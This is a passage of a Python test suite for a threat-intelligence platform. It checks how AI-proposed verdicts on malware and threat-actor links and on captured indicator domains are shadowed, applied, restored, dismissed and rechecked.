    await _seed_settings(db_session)
    entry, royal, held = await _held_royal(db_session, feed)
    db_session.add(
        FalsePositiveRecord(
            entity_type="malware",
            entity_id=royal.id,
            entity_value="Royal",
            source_entry_id=entry.id,
            marked_by=admin_user.id,
            extraction_source="ai_reconcile",
        )
    )
    await db_session.flush()
    _items, verdicts = await _verdicts_for(db_session, entry, _link_royal(royal))
    detail = await apply_verdicts(db_session, entry, verdicts, _payload(), await adj._settings(db_session))
    await db_session.flush()

    assert detail["shadowed"] == 1 and detail["applied"] == 0
    assert await _royal_links(db_session, entry) == []
    row = (await db_session.execute(_held_link_rows())).scalar_one()
    assert row.applied is False and row.before["entity"]["name"] == "Royal"
    assert row.before["held"]["paragraph_indices"] == [1]

    # The same verdict on a second review is not filed twice.
    await apply_verdicts(db_session, entry, verdicts, _payload(), await adj._settings(db_session))
    await db_session.flush()
    assert len((await db_session.execute(_held_link_rows())).scalars().all()) == 1

    assert (await adj.apply_adjudication_row(db_session, row))["applied"] is True
    await db_session.flush()
    assert [j.malware_family_id for j in await _royal_links(db_session, entry)] == [royal.id]
    assert row.after["created_link"] is True
    await db_session.refresh(held)
    assert held.resolution == "promoted"
    assert await db_session.scalar(select(func.count()).select_from(FalsePositiveRecord)) == 0

    assert (await adj.restore_adjudication_row(db_session, row))["restored"] is True
    await db_session.flush()
    assert await _royal_links(db_session, entry) == []
    await db_session.refresh(held)
    assert held.resolution == "rejected"


@pytest.mark.asyncio
async def test_a_held_link_proposal_still_links_after_its_held_row_is_pruned(db_session: AsyncSession, feed):
    await _seed_settings(db_session)
    entry, royal, held = await _held_royal(db_session, feed)
    _items, verdicts = await _verdicts_for(db_session, entry, _link_royal(royal))
    await apply_verdicts(db_session, entry, verdicts, _payload(), await adj._settings(db_session))
    await db_session.delete(held)
    await db_session.flush()

    row = (await db_session.execute(_held_link_rows())).scalar_one()
    assert (await adj.apply_adjudication_row(db_session, row))["applied"] is True
    await db_session.flush()
    [link] = await _royal_links(db_session, entry)
    assert link.matched_names == ["Royal"] and link.paragraph_indices == [1]


@pytest.mark.asyncio
async def test_apply_mode_links_a_held_match_at_high_confidence_only(db_session: AsyncSession, feed):
    await _seed_settings(db_session, adjudication_mode="apply")
    entry, royal, held = await _held_royal(db_session, feed)
    _items, verdicts = await _verdicts_for(db_session, entry, _link_royal(royal, confidence="medium"))
    await apply_verdicts(db_session, entry, verdicts, _payload(), await adj._settings(db_session))
    await db_session.flush()
    assert await _royal_links(db_session, entry) == []

    _items, verdicts = await _verdicts_for(db_session, entry, _link_royal(royal))
    detail = await apply_verdicts(db_session, entry, verdicts, _payload(), await adj._settings(db_session))
    await db_session.flush()
    assert detail["applied"] == 1
    assert [j.malware_family_id for j in await _royal_links(db_session, entry)] == [royal.id]
    applied = (await db_session.execute(_held_link_rows().where(EntityMaintenanceLog.applied.is_(True)))).scalar_one()
    assert applied.before["held"]["id"] == str(held.id) and applied.after["created_link"] is True


@pytest.mark.asyncio
async def test_held_link_is_a_links_proposal():
    from app.services.proposal_apply import proposal_domain

    assert proposal_domain("entity_maintenance", adj.ACTION_HELD_LINK) == "links"


async def _analysed(db_session, entry, payload):
    from app.models.ai_result import AIResult
    from app.models.ai_task import AITask

    task = (await db_session.execute(select(AITask).where(AITask.name == "entry_analysis"))).scalar_one_or_none()
    if task is None:
        task = AITask(
            name="entry_analysis", display_name="t", description="", category="extraction", default_prompt_template="x"
        )
        db_session.add(task)
        await db_session.flush()
    db_session.add(
        AIResult(
            entry_id=entry.id,
            target_type="entry",
            target_id=entry.id,
            is_current=True,
            task_id=task.id,
            prompt_used="",
            raw_response="",
            parsed_result=payload,
        )
    )
    await db_session.flush()


@pytest.mark.asyncio
async def test_settle_runs_late_holds_against_the_stored_analysis(db_session: AsyncSession, feed):
    from app.intelligence.autolink_reconcile import settle_held_on_analysed_entries

    named, royal, held_named = await _held_royal(db_session, feed, resolution=None)
    other, _royal, held_other = await _held_royal(db_session, feed, resolution=None, royal=royal)
    _waiting, _royal, held_waiting = await _held_royal(db_session, feed, resolution=None, royal=royal)
    await _analysed(db_session, named, _payload(malware=[{"name": "Royal"}]))
    await _analysed(db_session, other, _payload())
    for entry in (named, other):
        row = await _request(db_session, entry)
        row.adjudication_status = adj.COMPLETED
    await db_session.flush()

    totals = await settle_held_on_analysed_entries(db_session)
    assert totals == {"entries": 2, "promoted": 1, "rejected": 1}
    assert held_named.resolution == "promoted" and held_other.resolution == "rejected"
    assert held_waiting.resolution is None  # its analysis has not run; it settles when it lands
    assert [j.malware_family_id for j in await _royal_links(db_session, named)] == [royal.id]
    for entry in (named, other):
        req = (
            await db_session.execute(select(AIAnalysisRequest).where(AIAnalysisRequest.entry_id == entry.id))
        ).scalar_one()
        assert req.adjudication_status == adj.RECHECK and req.adjudication_recheck_since is not None


@pytest.mark.asyncio
async def test_reopen_gives_a_pruned_article_a_request_row_and_leaves_queued_ones(db_session: AsyncSession, feed):
    since = datetime.now(UTC)
    pruned = await _make_entry(db_session, feed)
    await adj.reopen_adjudication(db_session, pruned.id, since)
    req = (
        await db_session.execute(select(AIAnalysisRequest).where(AIAnalysisRequest.entry_id == pruned.id))
    ).scalar_one()
    assert req.adjudication_status == adj.RECHECK and req.adjudication_recheck_since == since

    entry = await _make_entry(db_session, feed)
    row = await _request(db_session, entry)
    for status in (adj.PENDING, adj.SKIPPED_PLAN, adj.SKIPPED_ECHO, None):
        row.adjudication_status = status
        await adj.reopen_adjudication(db_session, entry.id, since)
        assert row.adjudication_status == status
    row.adjudication_status = adj.SKIPPED_OFF
    await adj.reopen_adjudication(db_session, entry.id, since)
    assert row.adjudication_status == adj.RECHECK


@pytest.mark.asyncio
async def test_a_recheck_reviews_only_the_held_matches(db_session: AsyncSession, feed):
    entry, royal, held = await _held_royal(db_session, feed, resolution="promoted")
    await _link_actor(db_session, entry, "Warlock")
    since = held.resolved_at
    db_session.add(EntryMalware(entry_id=entry.id, malware_family_id=royal.id, source="auto_link"))
    other = MalwareFamily(name="Hive")
    db_session.add(other)
    await db_session.flush()
    db_session.add(
        PendingAutolinkMatch(
            entry_id=entry.id,
            entity_type="malware",
            entity_id=other.id,
            canonical_name="Hive",
            matched_names=["Hive"],
            resolution="rejected",
            resolved_at=datetime.now(UTC),
        )
    )
    await db_session.flush()

    full, _ = await build_manifest(db_session, entry, _payload())
    assert any(it.name == "Warlock" for it in full)
    items, _ = await build_manifest(db_session, entry, _payload(), recheck_since=since)
    assert {it.item_id for it in items} == {f"link:malware:{royal.id}", f"held:malware:{other.id}"}


@pytest.mark.asyncio
async def test_review_owed_after_a_late_settle(db_session: AsyncSession, feed):
    entry, _royal, held = await _held_royal(db_session, feed, reviewed=True)
    started = datetime.now(UTC)
    scope = {"links", "observables"}
    assert not await adj.review_owed(db_session, entry, started, scope)
    held.resolution, held.resolved_at = "promoted", datetime.now(UTC)
    await db_session.flush()
    assert await adj.review_owed(db_session, entry, started, scope)
    assert not await adj.review_owed(db_session, entry, started, {"observables"})


@pytest.mark.asyncio
async def test_created_trigger_counts_an_unjudged_held_reject(db_session: AsyncSession, feed):
    entry, _royal, held = await _held_royal(db_session, feed)
    assert await adj._created_something(db_session, entry.id, None)
    held.reviewed_at = datetime.now(UTC)
    await db_session.flush()
    assert not await adj._created_something(db_session, entry.id, None)


# ------------------------------------------------------------------ observable candidates


def _cand(value, kind="domain", **extra):
    return {"kind": kind, "value": value, "surface_form": value, "origin": "scan", **extra}


def _capture(value, kind="domain", confidence="high"):
    return {
        "item_id": f"ioc:{kind}:{value}",
        "verdict": "capture",
        "confidence": confidence,
        "reason": f"{value} is listed in the article's indicators",
    }


def _capture_rows():
    return select(EntityMaintenanceLog).where(EntityMaintenanceLog.action == adj.ACTION_IOC_CAPTURE)


@pytest.mark.asyncio
async def test_every_candidate_is_reviewed_scan_ones_too(db_session: AsyncSession, feed):
    entry = await _make_entry(db_session, feed)
    entry.observable_candidates = [_cand("beliefdesk.xyz", was_defanged=True), _cand("89.125.244.131", kind="ipv4")]
    await db_session.flush()
    items, block = await build_manifest(db_session, entry, _payload())
    iocs = [it for it in items if it.kind == "ioc"]
    assert [it.ioc_value for it in iocs] == ["beliefdesk.xyz", "89.125.244.131"]  # defanged first
    assert all(it.staged for it in iocs) and "CANDIDATE: spotted by the pattern scan" in block

    await adj.mark_reviewed(db_session, entry, items)
    assert all(c.get("reviewed") for c in entry.observable_candidates)
    items, _ = await build_manifest(db_session, entry, _payload())
    assert not any(it.kind == "ioc" for it in items)


def test_validate_capture_only_on_a_candidate():
    staged = ReviewItem(item_id="ioc:domain:a.xyz", kind="ioc", line="", name="a.xyz", staged=True)
    captured = ReviewItem(item_id="ioc:domain:b.xyz", kind="ioc", line="", name="b.xyz")
    verdicts, stats = _validate_verdicts({"verdicts": [_capture("a.xyz"), _capture("b.xyz")]}, [staged, captured])
    assert [v.verdict for v in verdicts] == ["capture", "keep"]
    verdicts, stats = _validate_verdicts({"verdicts": []}, [staged])
    assert stats["candidates_unanswered"] == 1


@pytest.mark.asyncio
async def test_shadow_capture_is_a_proposal_that_applies_and_restores(db_session: AsyncSession, feed):
    from app.models.observable import EntryObservable, Observable

    await _seed_settings(db_session)
    entry = await _make_entry(db_session, feed)
    entry.observable_candidates = [_cand("beliefdesk.xyz", was_defanged=True, role="delivery")]
    await db_session.flush()
    _items, verdicts = await _verdicts_for(db_session, entry, [_capture("beliefdesk.xyz")])
    detail = await apply_verdicts(db_session, entry, verdicts, _payload(), await adj._settings(db_session))
    await db_session.flush()
    assert detail["shadowed"] == 1
    assert await db_session.scalar(select(func.count()).select_from(Observable)) == 0
    row = (await db_session.execute(_capture_rows())).scalar_one()
    assert row.applied is False and row.entity_type == "observable" and row.entity_id is None

    from app.services.proposal_apply import proposal_domain

    assert proposal_domain("entity_maintenance", row.action) == "entities"

    assert (await adj.apply_adjudication_row(db_session, row))["applied"] is True
    await db_session.flush()
    obs = (await db_session.execute(select(Observable))).scalar_one()
    assert (obs.value, obs.created_via, obs.role, obs.needs_review) == (
        "beliefdesk.xyz",
        "adjudicator",
        "delivery",
        True,
    )
    sighting = (await db_session.execute(select(EntryObservable))).scalar_one()
    assert sighting.source == "adjudicator" and sighting.was_defanged is True
    assert entry.observable_candidates == []
    assert row.entity_id == obs.id

    assert (await adj.restore_adjudication_row(db_session, row))["deleted"] is True
    await db_session.flush()
    assert await db_session.scalar(select(func.count()).select_from(Observable)) == 0
    [back] = entry.observable_candidates
    assert back["value"] == "beliefdesk.xyz" and back["reviewed"] is True


@pytest.mark.asyncio
async def test_apply_mode_captures_at_high_confidence(db_session: AsyncSession, feed):
    from app.models.observable import Observable

    await _seed_settings(db_session, adjudication_mode="apply")
    entry = await _make_entry(db_session, feed)
    entry.observable_candidates = [_cand("beliefdesk.xyz"), _cand("inkact.xyz")]
    await db_session.flush()
    _items, verdicts = await _verdicts_for(
        db_session, entry, [_capture("beliefdesk.xyz"), _capture("inkact.xyz", confidence="medium")]
    )
    detail = await apply_verdicts(db_session, entry, verdicts, _payload(), await adj._settings(db_session))
    await db_session.flush()
    assert detail["applied"] == 1
    assert [o.value for o in (await db_session.execute(select(Observable))).scalars()] == ["beliefdesk.xyz"]
    pending = (await db_session.execute(_capture_rows().where(EntityMaintenanceLog.applied.is_(False)))).scalar_one()
    assert pending.after["value"] == "inkact.xyz"


@pytest.mark.asyncio
async def test_capturing_a_never_capture_value_is_moot(db_session: AsyncSession, feed):
    from app.models.observable import Observable
    from app.services.proposal_apply import outcome_is_moot

    await _seed_settings(db_session)
    entry = await _make_entry(db_session, feed)
    db_session.add(Observable(kind="domain", value="beliefdesk.xyz", is_denied=True, created_via="manual"))
    entry.observable_candidates = [_cand("beliefdesk.xyz")]
    await db_session.flush()
    _items, verdicts = await _verdicts_for(db_session, entry, [_capture("beliefdesk.xyz")])
    await apply_verdicts(db_session, entry, verdicts, _payload(), await adj._settings(db_session))
    row = (await db_session.execute(_capture_rows())).scalar_one()
    outcome = await adj.apply_adjudication_row(db_session, row)
    assert outcome == {"applied": False, "reason": "value refused"} and outcome_is_moot(row, outcome)


@pytest.mark.asyncio
async def test_candidates_past_the_cap_are_owed_a_recheck(db_session: AsyncSession, feed):
    entry = await _make_entry(db_session, feed)
    entry.observable_candidates = [_cand(f"host{i}.inkact.xyz") for i in range(adj._MAX_CANDIDATE_ITEMS + 3)]
    await db_session.flush()
    items, _ = await build_manifest(db_session, entry, _payload())
    assert sum(1 for it in items if it.kind == "ioc") == adj._MAX_CANDIDATE_ITEMS
    await adj.mark_reviewed(db_session, entry, items)
    started = datetime.now(UTC)
    assert await adj.review_owed(db_session, entry, started, {"observables"})
    recheck, _ = await build_manifest(db_session, entry, _payload(), recheck_since=started)
    assert len(recheck) == 3


@pytest.mark.asyncio
async def test_sweep_queues_recent_reviewed_articles_with_unjudged_candidates(db_session: AsyncSession, feed):
    from datetime import timedelta

    await _seed_settings(db_session)
    fresh = await _make_entry(db_session, feed)
    fresh.observable_candidates = [_cand("beliefdesk.xyz")]
    judged = await _make_entry(db_session, feed)
    judged.observable_candidates = [_cand("inkact.xyz", reviewed=True)]
    old = await _make_entry(db_session, feed)
    old.observable_candidates = [_cand("wishgrove.cfd")]
    old.fetched_at = datetime.now(UTC) - timedelta(days=adj.CANDIDATE_REVIEW_DAYS + 1)
    rows = {}
    for e in (fresh, judged, old):
        rows[e.id] = await _request(db_session, e)
        rows[e.id].adjudication_status = adj.COMPLETED
    await db_session.flush()

    assert await adj.queue_candidate_reviews(db_session) == 1
    assert rows[fresh.id].adjudication_status == adj.RECHECK
    assert rows[judged.id].adjudication_status == adj.COMPLETED
    assert rows[old.id].adjudication_status == adj.COMPLETED


@pytest.mark.asyncio
async def test_dropping_candidates_never_trips_the_breaker(db_session: AsyncSession, feed):
    await _seed_settings(db_session, adjudication_mode="apply")
    entry = await _make_entry(db_session, feed)
    await _link_actor(db_session, entry, "Warlock", article_count=14)
    entry.observable_candidates = [_cand(f"host{i}.inkact.xyz") for i in range(4)]
    await db_session.flush()
    drops = [
        {"item_id": f"ioc:domain:host{i}.inkact.xyz", "verdict": "drop", "confidence": "high", "reason": "example"}
        for i in range(4)
    ]
    _items, verdicts = await _verdicts_for(db_session, entry, drops)
    detail = await apply_verdicts(db_session, entry, verdicts, _payload(), await adj._settings(db_session))
    assert detail["mode"] == "apply" and detail["breaker"] is False and detail["applied"] == 4
    assert entry.observable_candidates == []


@pytest.mark.asyncio
async def test_processing_view_loads_with_no_entries_in_the_window(client, admin_headers, db_session: AsyncSession):
    resp = await client.get("/api/engine/processing", headers=admin_headers, params={"window": "24h"})
    assert resp.status_code == 200, resp.text
    assert resp.json()["entries"] == []


@pytest.mark.asyncio
async def test_a_dismissed_verdict_is_not_filed_or_applied_again(db_session: AsyncSession, feed, admin_user):
    from app.api.hygiene import dismiss_review_rows

    await _seed_settings(db_session)
    entry = await _make_entry(db_session, feed)
    storm = await _link_actor(db_session, entry, "Storm")
    raw = [
        {
            "item_id": f"link:threat_actor:{storm.id}",
            "verdict": "remove",
            "confidence": "high",
            "reason": "Storm here is weather",
        }
    ]
    _items, verdicts = await _verdicts_for(db_session, entry, raw)
    await apply_verdicts(db_session, entry, verdicts, _payload(), await adj._settings(db_session))
    await db_session.flush()
    [row] = (await db_session.execute(select(EntityLinkValidationLog))).scalars().all()
    assert await dismiss_review_rows(db_session, [("link_validator", row)], admin_user.id) == 1

    # The next review of the article says the same thing, in apply mode even:
    # nothing is filed, and the link stays.
    _items, verdicts = await _verdicts_for(db_session, entry, raw)
    cfg = {**(await adj._settings(db_session)), "mode": "apply"}
    detail = await apply_verdicts(db_session, entry, verdicts, _payload(), cfg)
    await db_session.flush()
    assert detail["dismissed_skipped"] == 1 and detail["applied"] == 0 and detail["shadowed"] == 0
    assert (await db_session.execute(select(EntityLinkValidationLog))).scalars().all() == []
    linked = (
        (await db_session.execute(select(EntryThreatActor).where(EntryThreatActor.entry_id == entry.id)))
        .scalars()
        .all()
    )
    assert [j.threat_actor_id for j in linked] == [storm.id]


@pytest.mark.asyncio
async def test_processing_view_takes_every_console_window(client, admin_headers, db_session: AsyncSession, feed):
    await _make_entry(db_session, feed)
    await db_session.commit()
    for window in ("1h", "24h", "7d", "30d", "all"):
        resp = await client.get("/api/engine/processing", headers=admin_headers, params={"window": window})
        assert resp.status_code == 200, (window, resp.text)
        assert resp.json()["stats"]["ingested"] >= 1 and len(resp.json()["stats"]["ingest_series"]) == 24


@pytest.mark.asyncio
async def test_a_malformed_review_still_marks_its_candidates_judged(db_session: AsyncSession, feed, monkeypatch):
    """A reply that answers one item twice writes nothing, but its candidates
    must not stay unjudged: the sweep would reopen the article every 30
    minutes for a month."""
    await _seed_settings(db_session)
    entry = await _make_entry(db_session, feed)
    row = await _request(db_session, entry)
    storm = await _link_actor(db_session, entry, "Storm")
    entry.observable_candidates = [_cand("beliefdesk.xyz")]
    await db_session.flush()
    keep = {"item_id": f"link:threat_actor:{storm.id}", "verdict": "keep", "confidence": "high", "reason": "named"}
    detail = await _run_task_with(
        db_session, monkeypatch, entry, {"_extraction_status": "success", "verdicts": [keep, keep]}
    )
    assert detail["skipped"] == "ai_bad_shape"
    assert all(c.get("reviewed") for c in entry.observable_candidates)
    row.adjudication_status = adj.COMPLETED
    await db_session.flush()
    assert await adj.queue_candidate_reviews(db_session) == 0


@pytest.mark.asyncio
async def test_candidate_sweep_waits_while_the_ai_queue_is_deep(db_session: AsyncSession, feed, monkeypatch):
    await _seed_settings(db_session)

    async def _deep() -> int:
        return adj.RESWEEP_QUEUE_CEILING + 1

    entry = await _make_entry(db_session, feed)
    entry.observable_candidates = [_cand("beliefdesk.xyz")]
    row = await _request(db_session, entry)
    row.adjudication_status = adj.COMPLETED
    await db_session.flush()
    monkeypatch.setattr(adj, "_ai_queue_depth", _deep)
    assert await adj.queue_candidate_reviews(db_session) == 0
    assert row.adjudication_status == adj.COMPLETED


@pytest.mark.asyncio
async def test_capture_automations_run_once_per_article(db_session: AsyncSession, feed, monkeypatch):
    await _seed_settings(db_session, adjudication_mode="apply")
    queued: list = []
    monkeypatch.setattr(
        "app.workers.automation_tasks.dispatch_observable_capture_automations",
        lambda entry_id, countdown=5: queued.append(entry_id),
    )
    entry = await _make_entry(db_session, feed)
    entry.observable_candidates = [_cand("beliefdesk.xyz"), _cand("inkact.xyz"), _cand("wishgrove.cfd")]
    await db_session.flush()
    _items, verdicts = await _verdicts_for(
        db_session, entry, [_capture("beliefdesk.xyz"), _capture("inkact.xyz"), _capture("wishgrove.cfd")]
    )
    detail = await apply_verdicts(db_session, entry, verdicts, _payload(), await adj._settings(db_session))
    assert detail["applied"] == 3 and queued == [entry.id]


@pytest.mark.asyncio
async def test_restoring_a_capture_keeps_an_observable_another_article_sights(db_session: AsyncSession, feed):
    from app.intelligence.observables import record_sighting
    from app.models.observable import EntryObservable, Observable

    await _seed_settings(db_session)
    entry = await _make_entry(db_session, feed)
    other = await _make_entry(db_session, feed)
    entry.observable_candidates = [_cand("beliefdesk.xyz")]
    await db_session.flush()
    _items, verdicts = await _verdicts_for(db_session, entry, [_capture("beliefdesk.xyz")])
    await apply_verdicts(db_session, entry, verdicts, _payload(), await adj._settings(db_session))
    row = (await db_session.execute(_capture_rows())).scalar_one()
    assert (await adj.apply_adjudication_row(db_session, row))["applied"] is True
    await db_session.flush()
    obs = (await db_session.execute(select(Observable))).scalar_one()
    await record_sighting(db_session, other.id, obs, source="manual", surface_form="beliefdesk.xyz")
    await db_session.flush()

    assert not (await adj.restore_adjudication_row(db_session, row)).get("deleted")
    await db_session.flush()
    assert (await db_session.execute(select(Observable))).scalar_one().id == obs.id
    sightings = (await db_session.execute(select(EntryObservable.entry_id))).scalars().all()
    assert sightings == [other.id]
    assert entry.observable_candidates[0]["value"] == "beliefdesk.xyz"


def test_dismissals_are_recorded_only_for_verdicts_a_review_checks():
    from app.api.hygiene import LINK_SOURCE, MAINT_SOURCE, _verdict_record

    entry_id, eid = uuid.uuid4(), uuid.uuid4()

    def maint(action, **after):
        return EntityMaintenanceLog(
            entity_type="threat_actor",
            entity_id=eid,
            action=action,
            before={"entry_id": str(entry_id)},
            after=after,
            applied=False,
        )

    link = EntityLinkValidationLog(entity_type="malware", entity_id=eid, entry_id=entry_id, action="shadow_remove")
    assert _verdict_record(LINK_SOURCE, link) == (adj.ACTION_UNLINK, "malware", eid, entry_id)
    for action in (
        adj.ACTION_VETO,
        adj.ACTION_MERGE,
        adj.ACTION_HELD_LINK,
        adj.ACTION_EDGE_DEMOTE,
        adj.ACTION_IOC_DROP,
    ):
        assert _verdict_record(MAINT_SOURCE, maint(action)) == (action, "threat_actor", eid, entry_id)
    for action in (adj.ACTION_ASSESSMENT, adj.ACTION_IOC_CAPTURE, "normalize_name"):
        assert _verdict_record(MAINT_SOURCE, maint(action)) is None
    # a duplicate review's merge is remembered as a pair instead
    assert _verdict_record(MAINT_SOURCE, maint(adj.ACTION_MERGE, origin="merge_review")) is None
